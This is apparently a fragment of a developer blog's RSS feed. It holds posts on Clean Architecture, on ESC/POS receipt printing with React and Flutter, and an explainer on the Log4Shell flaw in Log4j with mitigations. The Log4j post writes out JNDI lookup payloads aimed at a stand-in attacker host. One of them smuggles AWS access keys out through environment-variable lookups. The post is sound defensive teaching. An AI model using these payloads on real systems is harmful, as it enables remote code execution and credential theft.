+</blockquote>
+<h3 id="pros--cons" class="code-line" dir="auto" data-line="343">Pros &amp; Cons</h3>
+<table class="code-line" dir="auto" data-line="345">
+<thead class="code-line" dir="auto" data-line="345">
+<tr class="code-line" dir="auto" data-line="345">
+<th>Pros</th>
+<th>Cons</th>
+</tr>
+</thead>
+<tbody class="code-line" dir="auto" data-line="347">
+<tr class="code-line" dir="auto" data-line="347">
+<td>The architecture leans on top of a domain model</td>
+<td>The learning curve of the architecture is not straightforward. People tend to mess up splitting responsibilities between layers which sometimes causes problems in the domain layer.</td>
+</tr>
+<tr class="code-line" dir="auto" data-line="348">
+<td>The application logic depends on nothing. However, everything depends on it. That implies directed coupling.</td>
+<td>It sometimes causes indirection with the interfaces.</td>
+</tr>
+<tr class="code-line" dir="auto" data-line="349">
+<td>It is flexible to swap out any of the outer layers without impacting the inner layers’ logic.</td>
+<td>It potentially takes time to implement</td>
+</tr>
+<tr class="code-line" dir="auto" data-line="350">
+<td>The architecture allows intrinsic testability. As the core part of the application does not depend on anything from the outer layer, it can be easily and quickly tested in isolation.</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary" class="code-line" dir="auto" data-line="352">Summary</h3>
+<p class="code-line" dir="auto" data-line="354">Like all architectural concepts, Clean Architecture is a framework that you have to choose to adhere to throughout the life cycle of a piece of software. By complying with these rules is not difficult, and it will save you a lot of headaches going forward. However, It won’t physically prevent you from writing poor code. By separating the software into layers and leaning on the <em><strong>Dependency Rule</strong></em>, you will create a system that is intrinsically testable, with all the benefits that imply. Last but not least &#8211; <em><strong>A good architect pretends that the decision has not been made, and shapes the system in such a way that those decisions can still be deferred for as long as possible</strong></em>.</p>
+<p class="code-line" dir="auto" data-line="356">I hope the readers will find the benefits I highlighted in this article ????????.</p>
+<h3 id="good-reads" class="code-line" dir="auto" data-line="358">Good Reads</h3>
+<ul class="code-line" dir="auto" data-line="360">
+<li class="code-line" dir="auto" data-line="360"><strong>Robert C. Martin’s</strong>
+<ul class="code-line" dir="auto" data-line="361">
+<li class="code-line" dir="auto" data-line="361"><em><strong><a title="https://www.amazon.com/Clean-Architecture-Craftsmans-Software-Structure/dp/0134494164" href="https://www.amazon.com/Clean-Architecture-Craftsmans-Software-Structure/dp/0134494164" data-href="https://www.amazon.com/Clean-Architecture-Craftsmans-Software-Structure/dp/0134494164" data- rel="nofollow noopener" target="_blank">Clean Architecture: A Craftsman&#8217;s Guide to Software Structure and Design</a></strong></em></li>
+<li class="code-line" dir="auto" data-line="362"><em><a title="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html" href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html" data-href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html" data- rel="nofollow noopener" target="_blank"><strong>The Clean Code Blog</strong></a></em></li>
+<li class="code-line" dir="auto" data-line="363"><a title="https://www.amazon.com/Software-Development-Principles-Patterns-Practices/dp/0135974445" href="https://www.amazon.com/Software-Development-Principles-Patterns-Practices/dp/0135974445" data-href="https://www.amazon.com/Software-Development-Principles-Patterns-Practices/dp/0135974445" data- rel="nofollow noopener" target="_blank"><em><strong>Agile Software Development, Principles, Patterns, and Practices 1st Edition</strong></em></a></li>
+<li class="code-line" dir="auto" data-line="364"><em><strong><a title="https://www.amazon.com/Clean-Code-Handbook-Software-Craftsmanship/dp/0132350882" href="https://www.amazon.com/Clean-Code-Handbook-Software-Craftsmanship/dp/0132350882" data-href="https://www.amazon.com/Clean-Code-Handbook-Software-Craftsmanship/dp/0132350882" data- rel="nofollow noopener" target="_blank">Clean Code: A Handbook of Agile Software Craftsmanship</a></strong></em></li>
+</ul>
+</li>
+<li class="code-line" dir="auto" data-line="365"><a title="https://dave.cheney.net/2016/08/20/solid-go-design" href="https://dave.cheney.net/2016/08/20/solid-go-design" data-href="https://dave.cheney.net/2016/08/20/solid-go-design" data- rel="nofollow noopener" target="_blank"><em><strong>Solid Go Design</strong></em></a> &#8211; <em>Dave Cheney</em></li>
+<li class="code-line" dir="auto" data-line="366"><a title="https://cloud.google.com/apis/design/resources" href="https://cloud.google.com/apis/design/resources" data-href="https://cloud.google.com/apis/design/resources" data- rel="nofollow noopener" target="_blank"><em><strong>Resource Oriented Design</strong></em></a></li>
+</ul>
+]]></content:encoded>
+					
+					<wfw:commentRss>/blog/dive-to-clean-architecture/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>ESC/POS printing by bridging (React Js + Flutter)</title>
+		<link>/blog/esc-pos-printing-by-bridging-react-js-flutter/</link>
+					<comments>/blog/esc-pos-printing-by-bridging-react-js-flutter/#respond</comments>
+		
+		<dc:creator><![CDATA[Tahsin Siad]]></dc:creator>
+		<pubDate>Mon, 08 Aug 2022 12:53:46 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<category><![CDATA[Programming & Development]]></category>
+		<category><![CDATA[escpos-printing]]></category>
+		<category><![CDATA[javascript]]></category>
+		<category><![CDATA[ReactJS]]></category>
+		<guid isPermaLink="false">/?p=9756</guid>
+
+					<description><![CDATA[In this blog, we will discuss the implementation of pos printing in react js app and communicate with flutter app to print the receipt. Here there are two parts. Sending buffer data from reactjs Receiving buffer data from flutter app and sending it to pos printer. Before diving into details, first of all we have [&#8230;]]]></description>
+										<content:encoded><![CDATA[<p>In this blog, we will discuss the implementation of pos printing in react js app and communicate with flutter app to print the receipt. Here there are two parts.</p>
+<ul>
+<li aria-level="1">Sending buffer data from reactjs</li>
+<li aria-level="1">Receiving buffer data from flutter app and sending it to pos printer.</li>
+</ul>
+<p>Before diving into details, first of all we have to know what is pos printing, how it works. A short explanation is given below. If you want to know more, please google it.</p>
+<h3><strong>POS printing/receipt printing</strong></h3>
+<p>In restaurant/super shop we might see that the seller gives us a receipt after the successful bill payment using a pos printer. Some well known pos printer manufacturer companies are Sunmi, rongta, xprinter, star printer etc. There are 3 types of pos printers. They are thermal, inkjet and dot matrix. In our case, we have used a thermal printer. Receipts are printed by direct contact between the thermal head and thermal paper with the use of heat. Therefore, no ink is required.</p>
+<h3><strong>Sending buffer data from react js</strong></h3>
+<p>While we started thinking about the integration of pos printing in our system, we faced some challenges.</p>
+<ul>
+<li aria-level="1">Order api response</li>
+<li aria-level="1">Receipt Template</li>
+<li aria-level="1">Communication between flutter app and react js web app</li>
+<li aria-level="1">Printing setup (USB/Bluetooth)</li>
+</ul>
+<h4><strong>Order api response</strong></h4>
+<p>We know that flutter has complete pos printing libraries but why need to implement this from react js app. The answer is our system deals with multiple providers, different providers provide different responses while sending api responses. So, we need to process it from frontend to view those api responses. Another thing is displaying the whole website into  webview. For this, flutter app has limited access to get the order response from the backend. Thus, we overcame the first problem.</p>
+<h4><strong>Receipt Template</strong></h4>
+<p>The main challenge was making the template. Initially, we thought of making a template using html and css. Because it is developer friendly and easy to maintain. But, pos printer doesn’t support html. It only understands the <a href="https://aures-support.com/DATA/drivers/Imprimantes/Commande%20ESCPOS.pdf" rel="nofollow noopener" target="_blank">esc/pos command</a>. So, we had to change our decision. There are a lot of libraries for generating templates using the esc/pos command. But, coping up with our api response was a little bit tough as there were nested level addons list. Then, we found <a href="https://www.npmjs.com/package/@tillpos/xml-escpos-helper" rel="nofollow noopener" target="_blank">xml-escpose-helper</a> library which provided a xml layout, converted the xml into esc/pos command using xml parser and generated our desired buffer data. It supports all the basic things you need like raw text, qr code, bar code, image, new line, paper cut etc. Here, we have also used another npm library called <a href="https://www.npmjs.com/package/table" rel="nofollow noopener" target="_blank">table</a> which generates a string table like github readme table. It is very helpful to display the tabular format data easily.</p>
+<p><img decoding="async" class="alignnone size-large wp-image-9767" src="/wp-content/uploads/2022/07/escpos-156-1024x410.png" alt="escpos 156 ESC/POS printing by bridging (React Js + Flutter)" width="1024" height="410" srcset="/wp-content/uploads/2022/07/escpos-156-980x392.png 980w, /wp-content/uploads/2022/07/escpos-156-480x192.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw"></p>
+<h5><strong>Procedure</strong></h5>
+<p><b>STEPS 1: Template Data as object </b></p>
+<p>First, we need to make an object for populating the xml template. Keep in mind that the object key must be the same as the key used in the xml template.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">const templateData = {
+      orderDate: 'Oct 27, 2022, 12:00',
+      userName: 'Tahsin Ahmed Khan',
+      providerName: 'Test',
+      shortId: `#TS-1234`,
+      qrCode,
+      qrCodeLabel,
+      brandTemplateTable,
+      cartTemplateTable,
+      pricesTemplateTable,
+      totalTemplateTable,
+      logo: `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAQAAAC0NkA6AAA223pUWHRSYXcgcHJvZmlsZSB0eXBlIGV4aWYAAHjapZ1pkiY3zqT`
+}</pre>
+<p><b>STEPS 2: Xml template</b></p>
+<p>The key which is used in object must be the key of the template. Here, the key must be surrounded by two curly braces like <i>{{key}}. </i>Keep in mind that extra space causes problems while generating buffer. Please make sure to avoid it.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">export const cartXmlTemplate = (qrCodeContent, qrCodeLabel) =&gt; `
+  &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+  &lt;document&gt; 
+    &lt;text-line&gt;Order Date: {{orderDate}}&lt;/text-line&gt;
+    &lt;line-feed /&gt;
+    &lt;text-line size="1:1"&gt;{{userName}}&lt;/text-line&gt;
+    &lt;line-feed /&gt;
+    &lt;text-line size="1:1"&gt;{{providerName}} {{shortId}}&lt;/text-line&gt;
+    &lt;line-feed /&gt;
+    &lt;text-line&gt;{{brandTemplateTable}}&lt;/text-line&gt;
+    &lt;line-feed /&gt;
+    &lt;bold&gt;
+      &lt;text-line&gt;{{cartTemplateTable}}&lt;/text-line&gt;
+    &lt;/bold&gt;
+    &lt;text-line&gt;{{pricesTemplateTable}}&lt;/text-line&gt;
+    &lt;bold&gt;
+      &lt;text-line&gt;{{totalTemplateTable}}&lt;/text-line&gt;
+    &lt;/bold&gt;
+    &lt;line-feed /&gt;
+    ${qrCodeLabel ? `&lt;align mode="center"&gt; &lt;text-line&gt; {{qrCodeLabel}} &lt;/text-line&gt;&lt;/align&gt; &lt;line-feed /&gt;` : ``}
+    ${
+      qrCodeContent
+        ? `&lt;align mode="center"&gt;
+        &lt;image density="d24"&gt;
+        {{qrCode}}
+      &lt;/image&gt;
+      &lt;/align&gt; 
+    &lt;line-feed /&gt;`
+        : `&lt;line-feed /&gt;`
+    }
+    &lt;align mode="center"&gt;
+      &lt;small&gt;
+        &lt;text-line&gt;Powered by&lt;/text-line&gt;
+      &lt;/small&gt;
+      &lt;image density="d24"&gt;
+        {{logo}}
+      &lt;/image&gt;
+      &lt;small&gt;
+        &lt;text-line&gt;Company name&lt;/text-line&gt;
+      &lt;/small&gt;
+    &lt;/align&gt;
+    &lt;line-feed /&gt;
+    &lt;paper-cut/&gt;
+  &lt;/document&gt;`;
+</pre>
+<p><b>STEPS 3: Generating buffer from template data and xml</b></p>
+<p>A method called <code class="language-javascript">getBufferFromTemplate</code> takes 2 parameters. First parameter is xml, the second is template data as an object.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">const buffer = EscPos.getBufferFromTemplate(
+      cartXmlTemplate(qrCodeContent, qrCodeLabel),
+      templateData,
+    );</pre>
+<p>We faced some problems while trying to make a template. They were–</p>
+<ul>
+<li aria-level="1">Some characters aren’t supported by pos printers like Peso (Philippines currency). Because, it depends on its code page. In computing, a <a href="https://en.wikipedia.org/wiki/Code_page" rel="nofollow noopener" target="_blank">code page</a> is a character encoding and as such it is a specific association of a set of printable characters and control characters with unique numbers. Some renowned code pages are PC437（Standard Europe), Katakana, PC850（Multilingual, PC860（Portuguese), PC863 (Canadian), PC865（Nordic) etc. It varies from printer to printer.</li>
+<li aria-level="1">Most of the printers support bar code but some of them don’t support qr code. We also faced this problem. We overcame this problem using <a href="https://www.npmjs.com/package/@cheprasov/qrcode" rel="nofollow noopener" target="_blank">@cheprasov/qrcode</a>. It converts the qrcode as image and image is supported by pos printer.</li>
+</ul>
+<p>Summarising the whole process is like this –</p>
+<blockquote><p><b><i>Template Data as object -&gt; Syncing with xml template -&gt; Generate buffer using data and xml template -&gt; Send it to flutter app -&gt; Ready to Print</i></b></p></blockquote>
+<h3><strong>Communication between flutter app and react js web app</strong></h3>
+<p>The problem is quite simple. We took the help of <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" rel="nofollow noopener" target="_blank">postMessage</a> which solved our second problem. After making the buffer data from order api response, we sent it to the flutter end using postMessage.</p>
+<h3><strong>Receiving buffer and Printing Receipt<br />
+</strong></h3>
+<p>Currently we are providing support for USB. The set up and printing process was done from the flutter end. So, please go to this <a href="/esc-pos-printing-with-flutter">link</a> to see the details.</p>
+<h3><strong>Final Output</strong></h3>
+<p><img decoding="async" class="alignnone size-large wp-image-9757" src="/wp-content/uploads/2022/07/IMG_20220725_172224-768x1024.jpg" alt="IMG 20220725 172224 ESC/POS printing by bridging (React Js + Flutter)" width="768" height="1024"></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/blog/esc-pos-printing-by-bridging-react-js-flutter/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Apache Log4j aka Log4Shell Vulnerability &#8211; Remote Code Execution</title>
+		<link>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/</link>
+					<comments>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/#comments</comments>
+		
+		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
+		<pubDate>Thu, 30 Dec 2021 18:35:45 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<category><![CDATA[Personal]]></category>
+		<category><![CDATA[Programming & Development]]></category>
+		<category><![CDATA[Technology]]></category>
+		<category><![CDATA[Java]]></category>
+		<category><![CDATA[logging]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<guid isPermaLink="false">/?p=5037</guid>
+
+					<description><![CDATA[Critical Severity Web Vulnerability When it comes to open-source projects there is a general assumption, as it&#8217;s an open-source project, many members(sometimes a lot) are watching and constantly reviewing this codebase so it should have fewer errors and vulnerabilities. But it&#8217;s normal for us programmers to make mistakes. This article discusses a recently found vulnerability [&#8230;]]]></description>
+										<content:encoded><![CDATA[<h3 id="critical-severity-web-vulnerability">Critical Severity Web Vulnerability</h3>
+<p>When it comes to open-source projects there is a general assumption, as it&#8217;s an open-source project, many members(sometimes a lot) are watching and constantly reviewing this codebase so it should have fewer errors and vulnerabilities. But it&#8217;s normal for us programmers to make mistakes. This article discusses a recently found vulnerability in a very widely used library in Java, this is used for logging named <strong>Apache Log4j</strong> also known as <strong>Log4j</strong>.</p>
+<blockquote><p>Vulnerabilities are discovered all the time. Whenever a vulnerability is found, it gets patched by the community members as soon as possible.</p></blockquote>
+<p>I learned a lot from <a title="https://www.youtube.com/watch?v=uyq8yxWO1ls" href="https://www.youtube.com/watch?v=uyq8yxWO1ls" data-from-md="" rel="nofollow noopener" target="_blank">this video</a>. Anyone reading this article may refer to his videos for in-depth learning. Also, I&#8217;m using his used examples here too.</p>
+<p>Thanks, <a href="https://www.linkedin.com/in/rafat-ibn-rashid/" rel="nofollow noopener" target="_blank">Rafat Rashid</a> for proofreading my post</p>
+<h2 id="what-is-log4j">What is Log4j?</h2>
+<p>Log4j is a very popular java logging library that is used for logging data from out program into files or console shells when something goes wrong, during debugging, errors are raised, API request body(payload), etc to lookup these logged data to troubleshoot or get better insights. This is usually what typical logging libraries are used for. This <code class="inline-code">Log4j</code> library was so popular that even if a java based codebase doesn&#8217;t use it directly, there is a very high possibility that some direct or indirect dependencies are using it. Now, because of the high usage of <code class="inline-code">Log4j</code>, the recently found vulnerability raises some serious concern for the java based applications.</p>
+<blockquote>
+<h4 id="any-java-codebase-that-uses-log4j-can-be-hacked-unless-you-are-using-their-latest-patch-version2171-after-this-vulnerability-was-found">Any <code class="inline-code">java</code> codebase that uses <code class="inline-code">Log4j</code> can be hacked unless you are using their latest patch version(&gt;=2.17.1) after this vulnerability was found.</h4>
+</blockquote>
+<p>All enterprise and other application developers are now racing to put this patch, updating their <code class="inline-code">Log4j</code> version to the recently patched version which is 2.17.1 or higher(in the future) to avoid this vulnerability in their programs. Upgrading the <code class="inline-code">Log4j</code> or any other package may lead to more bugs if you don&#8217;t know what you&#8217;re doing. As we speak many packages apply these patches to the code where they use <code class="inline-code">Log4j</code>. But there&#8217;s a possibility that some may not apply this patch which makes us vulnerable if we use that third-party library package in our codebase.</p>
+<blockquote><p>Note: Hackers are also racing to exploit their targets before applications apply this patch to their codebase and deploy it into production.</p></blockquote>
+<p>Those of us who are thinking, well, we don&#8217;t use <code class="inline-code">Log4j</code> in our codebase so this vulnerability isn&#8217;t going to affect us. Well, this is where the fun begins. Because of the popularity of <code class="inline-code">Log4j</code>, the third-party libraries and their direct/indirect dependent libraries may use log4j to log their stuff.</p>
+<blockquote><p>snyk &#8211; A developer security company &#8211; found out that almost 60% plus java applications out there use <code class="inline-code">Log4j</code> indirectly.</p></blockquote>
+<p>Using those usages of log4j in the dependencies of your application, your application falls under the threat of this vulnerability as well. So everyone needs to apply this patch to their codebase and redeploy their application into production.</p>
+<p>Those of us who are still thinking, we don&#8217;t have to put this patch or this vulnerability has nothing to do with us. There&#8217;s a scoring system called <code class="inline-code">CVSS</code> which stands for <strong>Common Vulnerability Scoring System</strong>. It provides a way to capture the principal characteristics of a vulnerability and produce a numerical score reflecting its severity. This <code class="inline-code">CVSS</code> system rated this vulnerability 10 out of 10 which is pretty scary for java developers. This vulnerability has the highest score possible. And why is that? The reason for this is, this vulnerability enables what is known as <strong>RCE</strong>.</p>
+<h2 id="what-is-rce">What is RCE?</h2>
+<p><code class="inline-code">RCE</code> stands for <strong>Remote Code Execution</strong>. What this means is, hackers are allowed to execute any code on your machine by hacking into your application which uses <code class="inline-code">log4j</code> directly or indirectly. This vulnerability was nick-named as <code class="inline-code">Log4Shell</code> and the reason is, anyone can open a shell on your server and issue commands. Scary right?</p>
+<p>Let&#8217;s explain how we arrive at this scary problem. There are a few things that lead to this vulnerability altogether. Let&#8217;s go one by one.</p>
+<h4 id="1-log4j-allow-us-to-log-expressions">1. Log4j allow us to log expressions</h4>
+<div class="joplin-editable">
+<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
+logClient.Error(&quot;error message: {}&quot;, error.getMessages());</code></pre>
+</div>
+<p>In the first line, we get the logger client and then we log the error messages. So we are plugging the error object into the string. Java will run this <code class="inline-code">error.getMessages()</code> code and send this value which will be used by <code class="inline-code">log4j</code> to plug that error value into the string. We&#8217;ll see an output that will contain the error string and whatever the <code class="inline-code">error.getMessages</code> returns into that <code class="inline-code">{}</code> curly braces which are called <strong>string interpolation</strong> and going to print it.</p>
+<p>Another example,</p>
+<div class="joplin-editable">
+<pre><code class="language-java">logClient.Info(&quot;user {} has logged in using id {}&quot;, map.get(&quot;Name&quot;), user.getId());</code></pre>
+</div>
+<p>As long as the value passed here log4j will print it and it&#8217;s the standard logging mechanism by most of the logging library, there&#8217;s nothing special, right? This mechanism is not the problem here.</p>
+<h4 id="2-jndi">2. JNDI</h4>
+<p><code class="inline-code">JNDI</code> stands for <strong>Java Naming and Directory Interface</strong>. This allows us to store java objects to a remote location and then serialize them to your <code class="inline-code">JVM</code> which is kind of streaming to <code class="inline-code">JVM</code>. As scary as it seems, this technology has been in existence from the era before rest API and it was quite popular at that time. This was a redistributed java system that would work with each other to communicate. This has lost its popularity now but it still exists in java for backward compatibility reasons.<br />
+Let&#8217;s have an example,</p>
+<div class="joplin-editable">
+<pre><code class="language-">ldap://192.168.1.22:8080/O=Rezwanul,C=BD</code></pre>
+</div>
+<p>This is an active directory link that uses <code class="inline-code">LDAP</code> protocol and we can invoke the URL and get a serialized java object in return from somewhere from a remote server. In our example, it is most probably the profile object we get from the active directory. This has nothing to do with <code class="inline-code">log4j</code>, It&#8217;s a Java feature that has been in java for years. We can enable/disable it, it&#8217;s encouraged to disable it. It hasn&#8217;t been removed from java because java never deprecates anything for backward compatibility reasons, for example, even codes from 1995(java first released year) code can be run on the latest JVM and latest Java compiler.</p>
+<blockquote>
+<h4 id="this-feature-is-harmless-in-and-as-of-itself">This feature is harmless in and as of itself</h4>
+</blockquote>
+<h4 id="3-jndi-lookup-in-log-messages">3. JNDI lookup in log messages</h4>
+<p>In 2013, A feature was introduced in Log4j by a contributor, which uses the <code class="inline-code">JNDI</code> lookups from the logging messages. A good use case for this feature would be a centralized logging configuration from a config server and we want to serialize that configuration using <code class="inline-code">JNDI</code> lookups.<br />
+Let&#8217;s go back to our first log message example again&#8230;</p>
+<div class="joplin-editable">
+<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
+logClient.Error(&quot;error message: {}&quot;, error.getMessages());</code></pre>
+</div>
+<p>We&#8217;re going to use log message for <code class="inline-code">JNDI</code> lookups</p>
+<div class="joplin-editable">
+<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
+logClient.Error(&quot;{}: error: {}&quot;, &quot;${jndi:ldap://logconfig/prefix}&quot;, error.getMessages());</code></pre>
+</div>
+<p>So what we&#8217;re doing here is, we&#8217;re getting a prefix for the logging message from the configuration server and passing the <code class="inline-code">JNDI</code> URL as an argument. We&#8217;re not passing a value that auto resolves but we&#8217;re passing a URL as a string value but this is not something that JAVA resolves, this is something that we&#8217;re passing to log4j. The difference is <code class="inline-code">log4j</code> does lookups for certain types of strings.<br />
+For example,</p>
+<div class="joplin-editable">
+<pre><code class="language-java">logClient.Error(&quot;insert string here: {}&quot;, &quot;hello world&quot;);</code></pre>
+</div>
+<p>The above code will insert the <code class="inline-code">hello world</code> string in the curly braces. But the string we&#8217;re passing as an argument has a special syntax like below <code class="inline-code">${jndi:ldap://...}</code></p>
+<div class="joplin-editable">
+<pre><code class="language-java">logClient.Error(&quot;looks up value and insert: {}&quot;, &quot;${jndi:ldap://...}&quot;);</code></pre>
+</div>
+<p>This type of value says log4j to look up and resolve for a serialized value and insert it into the curly braces. As the argument says <code class="inline-code">JNDI</code> log4j uses a <code class="inline-code">JNDI</code> lookup and it&#8217;s going to look up the value and insert it into the braces. Another example</p>
+<div class="joplin-editable">
+<pre><code class="language-java">logClient.Error(&quot;looks up value and insert: {}&quot;, &quot;${env:ENV_VALUE}&quot;);</code></pre>
+</div>
+<p>As the argument says <code class="inline-code">env</code> log4j uses the environment variable lookups and inserts it into the curly braces.</p>
+<blockquote>
+<h3 id="this-is-the-vulnerability-were-talking-about-remote-code-executionrce">This is the vulnerability we&#8217;re talking about, <strong>Remote Code Execution(RCE)</strong></h3>
+</blockquote>
+<p>This feature aka serious bug requested in 2013. To check that <a title="https://issues.apache.org/jira/browse/LOG4J2-313" href="https://issues.apache.org/jira/browse/LOG4J2-313" data-from-md="" rel="nofollow noopener" target="_blank">click here</a>.</p>
+<p>Are you wondering how this is a vulnerability? Let&#8217;s give an example<br />
+Let&#8217;s say you&#8217;ve got a search page and an end-user can put some search criteria on an input box and submit it and on the server, you&#8217;re logging it, the search term.</p>
+<div class="joplin-editable">
+<pre><code class="language-java">logClient.Info(&quot;search page: searched issued for {}&quot;, searchTerm);</code></pre>
+</div>
+<p>With this simple Info log message, we can think about what can go wrong. Nothing right? Let&#8217;s imagine if the search term looks like below <code class="inline-code">${jndi:ldap://want.to.heck/maliciousobject}</code>, What will happen now, what will the simple Info log message do&#8230;</p>
+<p><code class="inline-code">log4j</code> will do a <code class="inline-code">JNDI</code> request to whatever domain passed in the search term.<br />
+Let&#8217;s use a simple diagram to show what&#8217;s happening</p>
+<p><img decoding="async" class="alignnone size-full wp-image-5039" src="/wp-content/uploads/2021/12/RCE.drawio.png" alt="RCE.drawio Apache Log4j aka Log4Shell Vulnerability - Remote Code Execution" width="578" height="413" srcset="/wp-content/uploads/2021/12/RCE.drawio.png 578w, /wp-content/uploads/2021/12/RCE.drawio-480x343.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 578px, 100vw"></p>
+<p>What&#8217;s happening here is, someone puts a <code class="inline-code">JNDI</code> URL as the search term and submits the request. The app server which contains that vulnerable log4j version logs the search term. The server now does a <code class="inline-code">JNDI</code> request to that malicious server and gets a serialized malicious object. What this malicious object contains who knows, log4j will take that object, and now your app <code class="inline-code">JVM</code> has a java object which the application didn&#8217;t put in there. That malicious server (well, the malicious people behind that server) now can put a java object in somebody else&#8217;s <code class="inline-code">JVM</code>.</p>
+<blockquote>
+<h3 id="this-sounds-like-crazy-but-this-is-what-this-vulnerability-is-to-be-exact">This sounds like crazy but This is what this vulnerability is to be exact.</h3>
+</blockquote>
+<p>So the malicious person, in his malicious java object, can put a static block that contains whatever code he wants and this is going to run it.</p>
+<p>Imagine you can insert the java object of your code in the JVM of a popular e-commerce website or JVM of a popular social media website and then you may control everything on that site. Sounds scary&#8230; Adding salt to this to make it more interesting is you can initiate this as many times as you want to execute whatever code you want to run this type of attack. This is also known as <strong>Remote code execution aka RCE</strong></p>
+<p>Isn&#8217;t this pattern almost looking like <strong>SQL Injection</strong>? SQL Injection is also a similar vulnerability. In this type of attack, a Malicious user put malicious SQL code which executes itself on your app code. You&#8217;re passing this malicious code as a query param from your app frontend. That&#8217;s why we don&#8217;t string append or didn&#8217;t do resolves on user inputs. We can call this <strong>Log Injection</strong> aka <strong>Log Forgery</strong>. Log injection attack has been happening for quite some time now.</p>
+<blockquote>
+<h4 id="log-injection-or-log-forgery-is-a-vulnerability-that-arises-when-un-trusted-and-un-validated-input-is-allowed-to-be-printed-in-system-log-files">Log Injection (or Log Forgery) is a vulnerability that arises when un-trusted and un-validated input is allowed to be printed in system log files.</h4>
+</blockquote>
+<p>Let&#8217;s look at the below search term.</p>
+<div class="joplin-editable">
+<pre><code class="language-">\nINFO: Looks like a problem with our calculation./nError: rollback transaction for Rezwanul</code></pre>
+</div>
+<p>This tells us we make a mistake in the calculation and we&#8217;re rollbacking the transaction. In contrast to this, we may decide to refund the user. but this isn&#8217;t the case really, right?<br />
+Log injections are easy to figure out and less harmful. We can&#8217;t do considerable damage with it. Compared to this <strong>RCE</strong> will result in a completely different story and cause serious problems.</p>
+<h2 id="solving-the-issue">Solving the Issue</h2>
+<h3 id="using-jvm-flags">Using JVM flags</h3>
+<p>This is the easiest one. Set these <code class="inline-code">JVM</code> flags to <code class="inline-code">false</code></p>
+<div class="joplin-editable">
+<pre><code class="language-java">com.sun.jndi.ldap.object.trustURLCodebase
+com.sun.jndi.rmi.object.trustURLCodebase</code></pre>
+</div>
+<p>Which is telling java that, do you want to trust code that is coming from a URL that handles JNDI or RMI URL resolves kind of stuff? Set these flags to <code class="inline-code">false</code> and you&#8217;re good to go. After that Java won&#8217;t run any code which is coming from a URL. Java will stop it and Log4j will be stopped from logging it.<br />
+Lots of people turn this off as this is scary stuff and yet lots of people out there don&#8217;t even know this exists and they have servers running with this thing turned on and if they have that version of log4j which is vulnerable, may cause serious problems.</p>
+<p>Even if these flags are turned off there is still vulnerability. Remember our environment variable resolving example in the above. Most application has some environment variable set up on the server.</p>
+<div class="joplin-editable">
+<pre><code class="language-java">${jndi:ldap://want.to.heck/${env:AWS_ACCESS_KEY}/${env:AWS_ACCESS_KEY_SECRET}}</code></pre>
+</div>
+<p>A call with the above example goes out like that, then JVM will resolve those environment variables and then initiate the JNDI request which leads to a security breach on AWS as the AWS keys are exposed. This may lead to a situation where clients experience unwanted bills on AWS. Scary right? We don&#8217;t want anything to happen to our clients, do we?</p>
+<p>So here is our next solution:</p>
+<h3 id="update-log4j">Update log4j</h3>
+<p>We need to update log4j to the latest version(like 2.17.1) which doesn&#8217;t have this vulnerability. This sounds simple but it can be problematic if you have dependencies that depend on something else which don&#8217;t support the latest log4j version you are trying to update. In that case we have to wait for that dependent library to patch log4j, well while we&#8217;re waiting scary things may happen if you want to take that risk.</p>
+<h3 id="patch-the-class-directly">Patch the class directly</h3>
+<p>So in this approach, we patch the java class directly into our version of log4j or the third-party library which uses log4j and patch it on the server so that we don&#8217;t face the above issue.</p>
+<p>If you like, you can read the same article on my<a href="https://rezwanul-haque.hashnode.dev/apache-log4j-aka-log4shell-vulnerability-remote-code-execution" rel="nofollow noopener" target="_blank"> [Personal blog]</a></p>
+<p>&gt; #### You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">[Here]</a></p>
+<h3 id="use-dependency-constraints-using-gradle">Use Dependency Constraints using Gradle</h3>
+<p>This will allow you to forcefully use a version of dependency you define in Gradle. No matter what the version that the dependent library use, you force them to use the version you choose.</p>
+<p>In Conclusion, Open Source projects are secure most of the time no doubt about it. But just because it&#8217;s open-source, doesn&#8217;t mean it hasn&#8217;t been exposed to vulnerability. Many people will review contributors code for bugs and vulnerability but We need to ask the question,</p>
+<blockquote>
+<h3 id="is-the-person-reviewing-a-piece-of-code-is-the-right-person-to-do-that-review-or-not">Is the person reviewing a piece of code is the right person to do that review or not?</h3>
+</blockquote>
+<p>This log4j vulnerability is out there for almost <strong>9</strong> years, who knows what type of problem it caused in all these years. From a developer&#8217;s perspective, our implemented code may not be buggy at first glance as we don&#8217;t think how a security expert will think on that same implementation.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/feed/</wfw:commentRss>
+			<slash:comments>2</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>A Smart Way To Store Weekdays In Database</title>
+		<link>/blog/a-smart-way-to-store-weekdays-in-database/</link>
